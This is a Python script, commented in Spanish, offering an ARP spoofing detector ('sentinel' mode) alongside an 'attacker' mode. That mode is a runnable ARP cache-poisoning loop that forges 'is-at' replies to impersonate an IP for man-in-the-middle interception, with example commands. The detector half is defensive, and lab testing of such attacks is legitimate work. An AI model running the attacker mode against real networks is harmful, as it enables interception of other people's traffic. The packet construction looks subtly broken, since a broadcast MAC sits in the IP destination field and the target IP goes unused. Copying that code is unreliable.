#!/usr/bin/env python3
"""
vamp_arp_sentinel.py — Detector y Laboratorio de ARP Spoofing
=============================================================
VampSecure Labs · VampSecure Studios
Para Uso Exclusivo en Pruebas de Penetración Autorizadas — v2.0

DESCRIPCIÓN GENERAL
-------------------
Herramienta de detección y laboratorio para ataques ARP spoofing y
envenenamiento de caché ARP (cache poisoning). Combina un monitor de
red pasivo (modo sentinel) con una PoC de ataque ARP controlada (modo
attacker), permitiendo al auditor tanto detectar actividad MitM activa
como validar la efectividad de sus controles de red en un entorno de
laboratorio autorizado.

La captura de paquetes se realiza mediante Scapy con filtro BPF "arp",
lo que garantiza bajo overhead y alta precisión. El módulo de validación
de scope asegura que la herramienta solo opere dentro de las subredes
autorizadas explícitamente.

ARQUITECTURA DE EJECUCIÓN (2 modos)
------------------------------------
  Modo sentinel (detección pasiva + activa)
    Fase 1 — Aprendizaje: captura paquetes ARP durante --learn-time segundos
             y construye la tabla canónica IP→MAC de la red.
    Fase 2 — Sellado: la tabla se congela; cualquier cambio de MAC en una
             IP ya conocida genera una ALERTA CRÍTICA (posible MitM activo).
             Las IPs nuevas generan un AVISO (nuevo host o spoofing).
    Salida: Rich Live table con el estado IP/MAC en tiempo real.

  Modo attacker (PoC de laboratorio)
    Envía respuestas ARP falsas (op=2 "is-at") suplantando una IP objetivo.
    Diseñado exclusivamente para validar controles de detección en entornos
    controlados. Requiere autorización explícita del propietario de la red.

DEPENDENCIAS
------------
  scapy    >= 2.5.0    — Captura y forja de paquetes de red (requiere root)
  rich     >= 13.7.0   — Salida de consola con formato enriquecido y tablas

AUTORÍA
-------
  © VampSecure Studios — VampSecure Labs Security Research Division
  Todos los derechos reservados. Uso exclusivo en entornos autorizados.
"""

from __future__ import annotations

import argparse
import ipaddress
import os
import sys
import threading
import time
from datetime import datetime
from typing import Dict, Optional

try:
    from scapy.all import ARP, IP, send, sniff, get_if_hwaddr, get_if_list
except ImportError:
    print("[ERROR] Instala scapy: pip install scapy", file=sys.stderr)
    sys.exit(1)

from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

# ────────────────────────────────────────────────────────────────────────────
# Constantes
# ────────────────────────────────────────────────────────────────────────────

VERSION = "2.0"
BANNER = r"""
  ____   ____    _    __  __ ____  _____ ____ _   _ ____  _____   _        _    ____ ____
 \ \ / / _  |  / \  |  \/  |  _ \/ ____/ ___| | | |  _ \| ____| | |      / \  | __ ) ___|
  \ V / (_| | / _ \ | |\/| | |_) \___ \| |___| | | | |_) |  _|   | |     / _ \ |  _ \___ \
   | |  \__, |/ ___ \| |  | |  __/ ___) |___  | |_| |  _ <| |___  | |___ / ___ \| |_) |__) |
   |_|     /_/_/   \_|_|  |_|_|   |____/\____|\___/|_| \_|_____| |_____/_/   \_|____/____/
        by VampSecure Studios · vamp-arp-sentinel v2.0 · Detector y Laboratorio de ARP Spoofing
        ──────────────────────────────────────────────────────────────────────────────────────────
        USO EXCLUSIVO EN AUDITORÍAS AUTORIZADAS · El uso no autorizado es ilegal
"""

console = Console()


# ────────────────────────────────────────────────────────────────────────────
# Validación de scope
# ────────────────────────────────────────────────────────────────────────────

class ScopeValidator:
    """
    Valida que la interfaz / subred pertenece al scope de la auditoría.

    Se acepta:
      · Un fichero scope.txt con subredes CIDR (una por línea)
      · Un argumento --subnet directo (e.g. 192.168.1.0/24)

    Si se omite el scope, la herramienta avisa pero permite continuar
    (útil en lab local sin restricciones formales).
    """

    def __init__(self, scope_file: Optional[str] = None, subnet: Optional[str] = None):
        self.networks: list[ipaddress.IPv4Network] = []
        if scope_file:
            self._load_file(scope_file)
        if subnet:
            try:
                self.networks.append(ipaddress.IPv4Network(subnet, strict=False))
            except ValueError as e:
                console.print(f"[red][SCOPE] Subred inválida: {e}[/]")
                sys.exit(1)

    def _load_file(self, path: str) -> None:
        """Carga subredes CIDR desde un fichero, ignorando comentarios."""
        try:
            with open(path, encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    try:
                        self.networks.append(ipaddress.IPv4Network(line, strict=False))
                    except ValueError:
                        console.print(f"[yellow][SCOPE] Línea ignorada (no es CIDR válido): {line}[/]")
        except FileNotFoundError:
            console.print(f"[red][SCOPE] Fichero no encontrado: {path}[/]")
            sys.exit(1)

    def is_authorized(self, ip: str) -> bool:
        """Comprueba si una IP está dentro de alguna subred autorizada."""
        if not self.networks:
            return True  # Sin scope → todo permitido (lab)
        try:
            addr = ipaddress.IPv4Address(ip)
            return any(addr in net for net in self.networks)
        except ValueError:
            return False

    def validate_or_warn(self) -> None:
        """Emite aviso si no hay scope definido."""
        if not self.networks:
            console.print(
                "[yellow]⚠  Sin scope definido. Usa --scope o --subnet para limitar "
                "el monitoreo a redes autorizadas.[/]"
            )


# ────────────────────────────────────────────────────────────────────────────
# Modo SENTINEL
# ────────────────────────────────────────────────────────────────────────────

class ARPSentinel:
    """
    Monitoriza tráfico ARP y detecta cambios de MAC (posible ARP spoofing).

    Ciclo de vida:
      1. Fase APRENDIZAJE (learn_time seg): registra tabla IP→MAC legítima
      2. Fase SELLADO: no acepta nuevas IPs; cualquier cambio de MAC es alerta
    """

    def __init__(self, iface: str, learn_time: int, scope: ScopeValidator):
        self.iface = iface
        self.learn_time = learn_time
        self.scope = scope
        self._table: Dict[str, str] = {}  # ip → mac conocida
        self._locked = False
        self._alerts: list[dict] = []
        self._lock = threading.Lock()

    # ── Tabla Rich para mostrar el estado IP/MAC ──────────────────────────

    def _build_table(self) -> Table:
        """Construye la tabla Rich con el estado actual IP→MAC."""
        t = Table(
            title="[bold cyan]ARP Sentinel — Tabla IP/MAC[/]",
            border_style="cyan",
            show_lines=True,
        )
        t.add_column("IP", style="green", width=16)
        t.add_column("MAC", style="cyan", width=20)
        t.add_column("Estado", width=12)
        t.add_column("Última vez", style="dim", width=20)

        estado = "[yellow]APRENDIENDO[/]" if not self._locked else "[green]SELLADA[/]"
        with self._lock:
            for ip, mac in sorted(self._table.items()):
                t.add_row(ip, mac, estado, datetime.now().strftime("%H:%M:%S"))
        return t

    def _build_alerts(self) -> Panel:
        """Construye el panel de alertas."""
        if not self._alerts:
            return Panel("[green]Sin alertas activas.[/]", title="[bold red]⚠ ALERTAS[/]", border_style="red")
        lines = []
        for a in self._alerts[-10:]:  # últimas 10 alertas
            lines.append(
                f"[{a['ts']}] [bold red]SPOOFING[/] {a['ip']} "
                f"→ original={a['orig_mac']} | nueva={a['new_mac']}"
            )
        return Panel("\n".join(lines), title="[bold red]⚠ ALERTAS[/]", border_style="red")

    # ── Procesamiento de paquetes ─────────────────────────────────────────

    def _process(self, pkt) -> None:
        """Callback para cada paquete ARP capturado."""
        if not (pkt.haslayer(ARP) and pkt[ARP].op == 2):
            return
        ip = pkt[ARP].psrc
        mac = pkt[ARP].hwsrc

        if not self.scope.is_authorized(ip):
            return  # Fuera de scope → ignorar

        with self._lock:
            if ip in self._table:
                if self._table[ip] != mac:
                    # ¡Cambio de MAC! → posible spoofing
                    alert = {
                        "ts": datetime.now().strftime("%H:%M:%S"),
                        "ip": ip,
                        "orig_mac": self._table[ip],
                        "new_mac": mac,
                    }
                    self._alerts.append(alert)
            else:
                if not self._locked:
                    self._table[ip] = mac

    # ── Ejecución principal ───────────────────────────────────────────────

    def run(self) -> None:
        """Inicia la captura ARP con visualización Rich en tiempo real."""
        self.scope.validate_or_warn()

        console.print(
            Panel(
                f"Interfaz: [bold]{self.iface}[/]  |  "
                f"Aprendizaje: [yellow]{self.learn_time}s[/]  |  "
                f"[dim]Ctrl+C para detener[/]",
                title="[bold cyan]ARP Sentinel v{} — Iniciando[/]".format(VERSION),
                border_style="cyan",
            )
        )

        sniff_thread = threading.Thread(
            target=sniff,
            kwargs={
                "iface": self.iface,
                "filter": "arp",
                "prn": self._process,
                "store": False,
                "stop_filter": lambda _: False,
            },
            daemon=True,
        )
        sniff_thread.start()

        layout = Layout()
        layout.split_column(
            Layout(name="table", ratio=3),
            Layout(name="alerts", ratio=1),
        )

        start = time.time()
        with Live(layout, console=console, refresh_per_second=2, screen=False):
            try:
                while True:
                    elapsed = time.time() - start
                    if not self._locked and elapsed >= self.learn_time:
                        self._locked = True
                        console.print(
                            "\n[bold green]✔ FASE SELLADA[/] — "
                            f"{len(self._table)} entradas en tabla. Vigilando cambios...\n"
                        )

                    layout["table"].update(self._build_table())
                    layout["alerts"].update(self._build_alerts())
                    time.sleep(0.5)
            except KeyboardInterrupt:
                pass

        console.print(
            Panel(
                f"Entradas aprendidas: {len(self._table)}\n"
                f"Alertas generadas:   {len(self._alerts)}",
                title="[bold cyan]Sesión finalizada[/]",
                border_style="cyan",
            )
        )


# ────────────────────────────────────────────────────────────────────────────
# Modo ATTACKER (PoC lab)
# ────────────────────────────────────────────────────────────────────────────

class ARPAttacker:
    """
    Generador de paquetes ARP falsos para laboratorio.

    ADVERTENCIA: Este módulo está diseñado EXCLUSIVAMENTE para entornos
    de laboratorio y pruebas de penetración con autorización escrita previa.
    El uso en redes sin autorización es ilegal.

    Técnica:
      Envía respuestas ARP (op=2 "is-at") anunciando que la IP suplantada
      pertenece a nuestra MAC. Objetivo recibe la respuesta y actualiza su
      cache ARP con la información falsa → Man-in-the-Middle.
    """

    def __init__(self, target_ip: str, fake_ip: str, iface: str, interval: float):
        self.target_ip = target_ip
        self.fake_ip = fake_ip
        self.iface = iface
        self.interval = interval

    def run(self) -> None:
        """Inicia el bucle de envío de paquetes ARP falsos."""
        try:
            my_mac = get_if_hwaddr(self.iface)
        except Exception as e:
            console.print(f"[red]Error al obtener MAC de {self.iface}: {e}[/]")
            sys.exit(1)

        console.print(
            Panel(
                f"Objetivo:       [bold red]{self.target_ip}[/]\n"
                f"IP suplantada:  [bold yellow]{self.fake_ip}[/]\n"
                f"Nuestra MAC:    [cyan]{my_mac}[/]\n"
                f"Interfaz:       {self.iface}\n"
                f"Intervalo:      {self.interval}s\n\n"
                "[dim]Ctrl+C para detener el ataque[/]",
                title="[bold red]⚠ ARP ATTACKER v{} — PoC Lab[/]".format(VERSION),
                border_style="red",
            )
        )

        # Paquete ARP falsificado: anunciamos que fake_ip está en nuestra MAC
        # pdst=ff:ff:ff:ff:ff:ff → broadcast (envenena toda la red)
        pkt = ARP(op=2, pdst="ff:ff:ff:ff:ff:ff", psrc=self.fake_ip, hwsrc=my_mac)

        count = 0
        table = Table(border_style="red")
        table.add_column("Paquetes", justify="right", style="red")
        table.add_column("Payload")
        table.add_column("Timestamp", style="dim")

        with Live(table, console=console, refresh_per_second=2):
            try:
                while True:
                    send(pkt, verbose=False)
                    count += 1
                    table.add_row(
                        str(count),
                        f"{self.fake_ip} is-at {my_mac}",
                        datetime.now().strftime("%H:%M:%S"),
                    )
                    time.sleep(self.interval)
            except KeyboardInterrupt:
                pass

        console.print(f"[bold red]Ataque finalizado.[/] Paquetes enviados: {count}")


# ────────────────────────────────────────────────────────────────────────────
# CLI
# ────────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    """Construye el parser de argumentos con subcomandos sentinel / attacker."""
    p = argparse.ArgumentParser(
        prog="vamp-arp-sentinel",
        description="VampSecure Labs — ARP Sentinel v{}: detector y PoC de ARP spoofing".format(VERSION),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # Monitorizar interfaz eth0 durante 15 segundos de aprendizaje
  sudo python vamp_arp_sentinel.py sentinel -i eth0 --learn-time 15

  # Restringir a subred autorizada
  sudo python vamp_arp_sentinel.py sentinel -i eth0 --subnet 192.168.10.0/24

  # PoC de ARP spoofing en lab local
  sudo python vamp_arp_sentinel.py attacker 192.168.1.100 192.168.1.1 -i eth0

ADVERTENCIA: Solo para uso en entornos autorizados.
""",
    )

    subs = p.add_subparsers(dest="mode", metavar="modo")
    subs.required = True

    # Subcomando sentinel
    sent = subs.add_parser("sentinel", help="Detectar ARP spoofing en la red")
    sent.add_argument("-i", "--iface", default="eth0", help="Interfaz de red (default: eth0)")
    sent.add_argument("--learn-time", type=int, default=10, metavar="SEG",
                      help="Segundos de fase de aprendizaje (default: 10)")
    sent.add_argument("-s", "--scope", metavar="FILE",
                      help="Fichero scope.txt con subredes CIDR autorizadas")
    sent.add_argument("--subnet", metavar="CIDR",
                      help="Subred autorizada (e.g. 192.168.1.0/24)")

    # Subcomando attacker
    att = subs.add_parser("attacker", help="PoC de ARP cache poisoning (solo lab)")
    att.add_argument("target_ip", help="IP de la víctima (objetivo del envenenamiento)")
    att.add_argument("fake_ip", help="IP a suplantar (disfraz)")
    att.add_argument("-i", "--iface", default="eth0", help="Interfaz de red (default: eth0)")
    att.add_argument("--interval", type=float, default=2.0, metavar="SEG",
                     help="Segundos entre paquetes (default: 2.0)")

    return p


def main() -> None:
    """Punto de entrada principal. Despacha al modo sentinel o attacker."""
    console.print(BANNER.format(version=VERSION), style="bold cyan")

    if os.geteuid() != 0:
        console.print("[red]ERROR: Esta herramienta requiere privilegios de root.[/]")
        sys.exit(1)

    parser = build_parser()
    args = parser.parse_args()

    if args.mode == "sentinel":
        scope = ScopeValidator(
            scope_file=getattr(args, "scope", None),
            subnet=getattr(args, "subnet", None),
        )
        sentinel = ARPSentinel(
            iface=args.iface,
            learn_time=args.learn_time,
            scope=scope,
        )
        sentinel.run()

    elif args.mode == "attacker":
        console.print(
            "[bold red]⚠  ADVERTENCIA: Modo attacker activo. "
            "Usa solo en entornos de laboratorio autorizados.[/]\n"
        )
        attacker = ARPAttacker(
            target_ip=args.target_ip,
            fake_ip=args.fake_ip,
            iface=args.iface,
            interval=args.interval,
        )
        attacker.run()


if __name__ == "__main__":
    main()
